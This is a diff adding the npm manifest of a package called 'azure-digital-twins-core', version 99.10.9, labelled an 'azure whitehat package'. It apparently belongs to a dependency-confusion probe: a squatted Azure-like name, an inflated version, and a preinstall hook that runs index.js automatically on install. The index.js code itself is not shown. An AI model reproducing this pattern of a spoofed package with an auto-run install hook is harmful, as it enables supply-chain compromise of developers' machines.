@@ -1,0 +1,39 @@
+{
+    "name": "azure-digital-twins-core",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "azure-digital-twins-core@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-3qN8o6XjWYN03XcmHKe8h5wLwiMW+XSN9YPxfy+XAOQmx5E3j9dzaykCWMQZIQduQNzGYwPqCsvUgh4KKxUoHw==",
+        "shasum": "016571d5829c455a77d3ae87def63be64782ccbb",
+        "tarball": "https://registry.npmjs.org/azure-digital-twins-core/-/azure-digital-twins-core-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3588,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoSnwCRA9TVsSAnZWagAAHJ4P/1n8VVfdKk01FVU80JDP\ndaQEO3BgdAN2kMJ5bLNY1IMVwOFhMGlhs7HAu0NTkz5/SFl4vUb38DKStXSK\nx4bLJ1jobqf6XAvhxALy4oMxYIvmbom/j24h8KdUragjVbn0jiSKPfR/CLyD\n+3dRxhiYUYKDsKwDrLs+w/EgKZRq096yG3c4l3ZbIzNQ9tdGYlT6J/KXe+3U\nshCnyoOTgeSKppcMfwxDEYzIftwPoMzloQPgXM4T3yzNCBx2Ze6D0/KBZBdy\nDQ+dZapxPDyhzgHVflG8MajPS1vbF6PcXrlXdpfz6iseZ1JVNmDOZZs6XH+2\nxgf07wx8/YPJVQaz6/oW5BQKLwy+iwkdJXq4w8We8U62mnxwx5g+W2hID1q/\n+EOgfCjE3jSDJIaj4JysxLzxn0qY//XpuRKVqSpCDso3RCburyEojJWYWUmF\nJWH20ibvY9h2UVfN+AHD094gRLvQfqWlmJLDeGXiPkL+PD6tqNtyafykUX7G\n0ho/PIqWs24TF1LyL7KonXSDL0L4l1L/c8M++Y8o+hpSqytQrWmoLwfJVKaj\nN8NpFGniRHURGTi+m3d60avGsI+RHG1qY+sW+0Ihjx1tkrPfhw5HunPXeD1A\nrbNvHH4XKo+4LoSInQYwRB3nEEe4G5NQD3bPypUcYkPmDTJrNPAtNJWzeCx5\n6EpQ\r\n=uSNM\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "azure-tests",
+        "email": "hussam.tes08+3@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "azure-tests",
+            "email": "hussam.tes08+3@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/azure-digital-twins-core_99.10.9_1637951984718_0.025576039803202555"
+    },
+    "_hasShrinkwrap": false
+}
